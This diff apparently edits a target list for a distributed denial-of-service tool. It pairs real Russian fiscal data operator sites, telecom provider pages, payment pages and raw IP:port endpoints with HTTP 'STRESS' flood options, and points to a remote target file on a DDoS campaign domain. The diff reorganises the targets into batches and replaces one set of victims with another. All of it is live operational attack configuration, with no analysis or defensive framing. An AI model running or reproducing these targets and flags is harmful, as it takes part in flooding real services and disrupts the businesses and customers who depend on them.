@@ -1,10 +1,13 @@
 #zhnec
 
-https://www.1-ofd.ru/ https://k-server.1-ofd.ru/ https://www.taxcom.ru/ https://lk-ofd.taxcom.ru/ https://www.ofd.ru https://www.e-ofd.ru/ https://ofd-magnit.ru/ https://kkttst.ofd-magnit.ru/CheckWebApp/fiscaldocsearch.zul https://www.garantexpress.ru/ https://ofd.kontur.ru/ https://cash-ntt.kontur.ru/ https://ofd.astralnalog.ru/ https://ofd.nvg.ru/home https://kkt.ofd-magnit.ru/CheckWebApp/login.zul https://ofd.beeline.ru/kkt-list https://ofd.esphere.ru/CheckWebApp/login.zul tcp://91.239.5.75:443 tcp://213.87.202.41:443 --http-methods GET STRESS
+https://www.1-ofd.ru/ https://k-server.1-ofd.ru/ https://www.taxcom.ru/ https://lk-ofd.taxcom.ru/ https://www.ofd.ru https://www.e-ofd.ru/ --http-methods GET STRESS
+https://ofd-magnit.ru/ https://kkttst.ofd-magnit.ru/CheckWebApp/fiscaldocsearch.zul https://www.garantexpress.ru/ https://ofd.kontur.ru/ --http-methods GET STRESS
+https://cash-ntt.kontur.ru/ https://ofd.astralnalog.ru/ https://ofd.nvg.ru/home https://kkt.ofd-magnit.ru/CheckWebApp/login.zul --http-methods GET STRESS
+https://ofd.beeline.ru/kkt-list https://ofd.esphere.ru/CheckWebApp/login.zul tcp://91.239.5.75:443 tcp://213.87.202.41:443 --http-methods GET STRESS
 
 #gaidamaky
 
-https://home.voice-connect.ru http://home.voice-connect.ru https://my.voice-connect.ru --http-methods STRESS POST
+https://neophones.ru https://neophones.ru/utm5/connect_master https://neocomms.ru/payment https://neocomms.ru/contacts https://neophones.ru/tariffs --http-methods STRESS POST
 -c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt
 
 #ddos separiv
